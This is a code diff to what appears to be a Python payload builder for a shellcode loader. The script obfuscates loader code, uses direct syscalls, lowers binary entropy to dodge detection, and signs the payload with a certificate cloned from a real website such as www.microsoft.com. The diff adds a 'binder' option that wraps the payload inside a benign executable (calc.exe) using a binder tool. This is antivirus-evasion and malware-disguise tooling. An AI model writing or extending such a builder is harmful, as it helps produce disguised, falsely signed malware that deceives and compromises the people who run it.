@@ -129,7 +129,7 @@ def read_shellcode(file_path):
 #             chosen_line_index = random.choice(safe_lines[1:-1])
 #             # Construct the modified content
 #             indentation = '    ' 
-#             modified_line = f"{indentation}executeAPIFunction();\n{lines[chosen_line_index]}" ## TODO: -j option is insrted to conflict with -e uuid option.
+#             modified_line = f"{indentation}executeAPIFunction();\n{lines[chosen_line_index]}" 
 #             lines[chosen_line_index] = modified_line
 
 #             # Reconstruct the content with the inserted call
@@ -756,6 +756,7 @@ def cleanup_files(*file_paths):
             # print(f"Deleted temporary file: {file_path}")
         except OSError as e:
             print(f"Error deleting temporary file {file_path}: {e}")
+            print(f"File may not exists.")
 
 
 def main():
@@ -897,6 +898,7 @@ def main():
                         help='Optional: Use SysWhisper for direct syscalls. 1 for random syscall jumps (default), 2 for compiling with MingW and NASM.')
 
     parser.add_argument('-entropy', type=int, choices=[1, 2], default=0, help='Entropy level for post-processing the output binary. 1 for null_byte.py, 2 for pokemon.py')
+    parser.add_argument('-b', '--binder', nargs='?', const='binder/calc.exe', help='Optional: Path to a utility for binding. Defaults to binder/calc.exe if not provided.')
     parser.add_argument('-s', '--sign-certificate', nargs='?', const='www.microsoft.com', help='Optional: Sign the payload using a cloned certificate from the specified website. Defaults to www.microsoft.com if no website is provided.')
 
     args = parser.parse_args()
@@ -989,7 +991,7 @@ def main():
     strip_binary(output_file_path)
 
     ## uncomment the below line to clean up obfuscation code base: 
-    cleanup_files(output_loader_path, output_loader_path.replace('.c', '_obf.c'))
+    # cleanup_files(output_loader_path, output_loader_path.replace('.c', '_obf.c'))
 
     ### Reduce the entropy to 6.1: 
     if args.entropy == 1:
@@ -1001,7 +1003,12 @@ def main():
     elif args.entropy == 0:
         print("No entropy reduction applied.\n")
 
-
+    if args.binder:
+        temp_output_file_path = output_file_path.replace('.exe', '_temp.exe')
+        binder_utility = args.binder if args.binder else 'binder/calc.exe'
+        subprocess.run(['wine', 'binder/binder.exe', output_file_path, binder_utility, binder_utility, '-o', temp_output_file_path], check=True)
+        ## rename temp file back to original:
+        os.rename(temp_output_file_path, output_file_path)
 
     if args.sign_certificate:
         website = args.sign_certificate  # Website provided by the user or default
